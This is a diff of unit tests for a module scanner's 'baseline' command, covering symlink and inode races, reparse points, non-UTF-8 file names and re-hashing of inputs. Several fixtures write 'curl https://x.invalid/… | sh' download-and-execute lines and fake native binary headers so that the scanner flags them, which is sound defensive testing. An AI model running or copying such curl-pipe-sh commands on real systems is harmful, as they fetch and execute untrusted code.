@@ -2,16 +2,18 @@
 
 Every fixture is a temporary tree built in the test; the two bundled examples must pass. Nothing
 here runs a backend or touches the network, and the route executes nothing in the tree. The
-"tree changes under the scan" cases patch the listing (``baseline._lstat``) so the open-side
-checks run against a file that is not what the listing said.
+"tree changes under the scan" cases patch the listing (``baseline._entry_stat``) so the open-side
+checks run against an entry that is not what the listing said.
 """
 import contextlib
 import io
 import json
 import os
+import stat
 import tempfile
 import unittest
 from pathlib import Path
+from types import SimpleNamespace
 from unittest import mock
 
 from plutonium_agent_toolkit.cli import entry
@@ -102,25 +104,16 @@ class BaselineFixture(unittest.TestCase):
         return directory
 
     def listing_of(self, target: Path, replacement):
-        """The listing's view of ``target`` becomes ``replacement(real_stat)`` and its link check says
-        "not a link"; every other entry is real. This is the race the open-side checks exist for: the
-        directory listing saw a regular file, and what is on disk by the time it is opened differs."""
-        real_lstat, real_is_link = baseline._lstat, baseline._is_link
+        """The listing's view of ``target`` becomes ``replacement(real_stat)``; every other entry is
+        real. This is the race the open-side checks exist for: the directory listing saw one thing,
+        and what is on disk by the time the entry is opened is another."""
+        real = baseline._entry_stat
         wanted = os.path.normcase(str(target))
 
-        def is_target(entry):
-            return os.path.normcase(str(entry)) == wanted
-
-        def fake_lstat(entry):
-            st = real_lstat(entry)
-            return replacement(st) if is_target(entry) else st
-
-        def fake_is_link(entry):
-            return False if is_target(entry) else real_is_link(entry)
-        stack = contextlib.ExitStack()
-        stack.enter_context(mock.patch.object(baseline, "_lstat", side_effect=fake_lstat))
-        stack.enter_context(mock.patch.object(baseline, "_is_link", side_effect=fake_is_link))
-        return stack
+        def fake(entry, path):
+            st = real(entry, path)
+            return replacement(st) if os.path.normcase(str(path)) == wanted else st
+        return mock.patch.object(baseline, "_entry_stat", side_effect=fake)
 
     def scan(self, directory, *extra):
         code, row = invoke(["registry", "baseline", str(directory), *extra, "--output", self.out()])
@@ -159,6 +152,7 @@ class ExampleTests(BaselineFixture):
             self.assertEqual(receipt["status"], "succeeded")
             self.assertIn("baseline.json", receipt["outputs"])
             self.assertEqual(receipt["steps"], [], "nothing was executed")
+            self.assertEqual(len(receipt["inputs"]), result["scanned"]["files"], "every file read is an input of the job")
         code, row = self.scan(ROOT / "examples" / "hello-zm")
         self.assertEqual(row["result"]["declaration"]["id"], "hello_zm")
         self.assertEqual(row["result"]["declaration"]["payload"], "recipe")
@@ -198,13 +192,14 @@ class BlockingFindingTests(BaselineFixture):
 
     def test_elf_and_macho_headers_and_plugin_paths(self):
         directory = self.module(files={"a.bin": b"\x7fELF" + b"\x00" * 32, "b.bin": b"\xcf\xfa\xed\xfe" + b"\x00" * 32,
-                                       "c.bin": b"\xca\xfe\xba\xbe" + b"\x00" * 32,
+                                       "c.bin": b"\xca\xfe\xba\xbe" + b"\x00" * 32, "d.bin": b"\xbe\xba\xfe\xca" + b"\x00" * 32,
                                        "README.md": "Copy the file into %LOCALAPPDATA%\\Plutonium\\plugins\\ before you start.\n",
                                        "install.txt": "then the loader picks up plugins/hook.dll on launch\n"})
         code, row = self.scan(directory)
         self.assertEqual(row["result"]["outcome"], "needs-fixes")
         rows = [(r["file"], r["line"]) for r in self.findings(row, "native-plugin")]
-        self.assertEqual(rows, [("README.md", 1), ("a.bin", None), ("b.bin", None), ("c.bin", None), ("install.txt", 1)])
+        self.assertEqual(rows, [("README.md", 1), ("a.bin", None), ("b.bin", None), ("c.bin", None), ("d.bin", None), ("install.txt", 1)])
+        self.assertIn("bebafeca", [r["evidence"] for r in self.findings(row, "native-plugin") if r["file"] == "d.bin"][0])
 
     def test_curl_pipe_sh_is_download_and_execute_and_the_script_is_an_installer(self):
         directory = self.module(files={"tools/get.sh": "#!/bin/sh\ncurl https://x.invalid/setup.sh | sh\n"})
@@ -544,6 +539,109 @@ class IncompleteAndBoundsTests(BaselineFixture):
             code, row = self.scan(directory)
         self.assertEqual(row["result"]["outcome"], "incomplete")
         self.assertEqual(row["result"]["unreadable"], [{"path": "swap.txt", "reason": "not a regular file when opened"}])
+
+    def test_an_ancestor_directory_replaced_between_listing_and_reading_is_unreadable(self):
+        if os.name == "nt":
+            self.skipTest("descriptor-relative opens are POSIX")
+        # The listing saw a plain directory; by the time it is opened it is a link to a directory
+        # outside the tree holding a blocking script. The open is relative to the parent's descriptor
+        # with O_NOFOLLOW, so it refuses, the subtree is unreadable, and nothing outside is read.
+        directory = self.module(files={"sub/keep.txt": "x\n"})
+        outside = self.root / "outside"
+        outside.mkdir()
+        (outside / "run.sh").write_text("curl https://x.invalid/a | sh\n")
+        listed = (directory / "sub").lstat()
+        (directory / "sub" / "keep.txt").unlink()
+        (directory / "sub").rmdir()
+        os.symlink(outside, directory / "sub")
+        with self.listing_of(directory / "sub", lambda st: listed):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 0, row)
+        self.assertEqual(row["result"]["outcome"], "incomplete")
+        self.assertEqual([r["path"] for r in row["result"]["unreadable"]], ["sub"])
+        reason = row["result"]["unreadable"][0]["reason"].lower()
+        self.assertTrue("symbolic link" in reason or "not a directory" in reason, reason)  # ELOOP or ENOTDIR: refused unopened
+        self.assertEqual(row["result"]["findings"], [], "the outside script was never read")
+        self.assertEqual(row["result"]["scanned"]["files"], 3)
+        # Same directory name, another inode: the identity check refuses it.
+        os.unlink(directory / "sub")
+        (directory / "sub").mkdir()
+        (directory / "sub" / "keep.txt").write_text("x\n")
+        with self.listing_of(directory / "sub", lambda st: stat_with(st, st_ino=st.st_ino + 1)):
+            code, row = self.scan(directory)
+        self.assertEqual(row["result"]["outcome"], "incomplete")
+        self.assertEqual(row["result"]["unreadable"], [{"path": "sub", "reason": "replaced between listing and reading"}])
+
+    def test_the_path_revalidation_walk_matches_the_descriptor_walk(self):
+        # Windows has no descriptor-relative opens: every component is re-checked by name before
+        # each open. Run that branch here: the same tree gives the same report, and a directory
+        # that became a link between the listing and the open is refused by the re-check.
+        directory = self.module(files={"sub/keep.txt": "x\n", "README.md": "https://example.invalid/x.zip\n"})
+        code, first = self.scan(directory)
+        with mock.patch.object(baseline, "DESCRIPTOR_WALK", False):
+            code, second = self.scan(directory)
+        self.assertEqual((Path(first["result"]["output"]) / "baseline.json").read_bytes(),
+                         (Path(second["result"]["output"]) / "baseline.json").read_bytes())
+        if os.name == "nt":
+            return
+        outside = self.root / "outside"
+        outside.mkdir()
+        (outside / "run.sh").write_text("curl https://x.invalid/a | sh\n")
+        listed = (directory / "sub").lstat()
+        (directory / "sub" / "keep.txt").unlink()
+        (directory / "sub").rmdir()
+        os.symlink(outside, directory / "sub")
+        with mock.patch.object(baseline, "DESCRIPTOR_WALK", False), self.listing_of(directory / "sub", lambda st: listed):
+            code, row = self.scan(directory)
+        self.assertEqual(row["result"]["outcome"], "incomplete")
+        self.assertEqual(row["result"]["unreadable"], [{"path": "sub", "reason": "replaced by a link between listing and reading"}])
+        self.assertEqual([r for r in row["result"]["findings"] if r["id"] == "download-and-execute"], [])
+
+    def test_reparse_points_count_as_links_from_the_listing_alone(self):
+        # Windows junctions carry the reparse attribute in lstat; Path.is_junction is not on every
+        # Python, so the attribute is what the walk reads. A symbolic link mode counts on every OS.
+        reparse = getattr(stat, "FILE_ATTRIBUTE_REPARSE_POINT", 0x400)
+        self.assertTrue(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFDIR, st_file_attributes=reparse)))
+        self.assertFalse(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFDIR, st_file_attributes=0)))
+        self.assertFalse(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFREG)))
+        self.assertTrue(baseline._is_link(SimpleNamespace(st_mode=stat.S_IFLNK)))
+
+    def test_a_file_changed_after_the_scan_fails_the_job(self):
+        # Every file read is an input of the job, so Job.finish re-hashes it: a script rewritten
+        # between the scan and the receipt is input_changed, never a report for an older tree.
+        directory = self.module()
+        real = baseline.execute
+
+        def scan_then_mutate(args, job):
+            result = real(args, job)
+            (directory / "scripts" / "round_announcer.gsc").write_text("main()\n{\n    replaceFunc( level.x, ::y );\n}\n")
+            return result
+        with mock.patch.object(baseline, "execute", side_effect=scan_then_mutate):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 1, row)
+        self.assertEqual(row["error_code"], "input_changed")
+        self.assertIn("round_announcer.gsc", row["message"])
+        receipt = json.loads(Path(row["receipt"]).read_text(encoding="utf-8"))
+        self.assertEqual(receipt["status"], "failed")
+        self.assertEqual(len(receipt["inputs"]), 3, "the receipt lists every file the scan read")
+
+    def test_a_file_name_that_is_not_utf8_is_scanned_and_shown_escaped(self):
+        if os.name == "nt":
+            self.skipTest("Windows file names are UTF-16; there is no undecodable name to make")
+        directory = self.module()
+        name = os.fsdecode(b"bad\xff.txt")
+        (directory / name).write_text("curl https://x.invalid/a | sh\n")
+        code, row = self.scan(directory)
+        self.assertEqual(code, 0, row)
+        self.assertEqual(row["result"]["outcome"], "needs-fixes")
+        self.assertEqual(row["result"]["scanned"]["files"], 4)
+        finding = self.findings(row, "download-and-execute")
+        self.assertEqual([r["file"] for r in finding], ["bad\\xff.txt"], "shown with a backslash escape, never dropped")
+        self.assertTrue((Path(row["result"]["output"]) / "baseline.json").is_file())
+        self.assertRegex(row["result"]["tree_sha256"], r"^[0-9a-f]{64}$")
+        receipt = json.loads(Path(row["result"]["receipt"]).read_text(encoding="utf-8"))
+        self.assertEqual(receipt["status"], "succeeded")
+        self.assertEqual(len(receipt["inputs"]), 4)
 
     def test_a_file_that_grows_after_the_listing_cannot_exceed_the_byte_bound(self):
         # The listing said 10 bytes; the file is larger by the time it is read. The bound applies
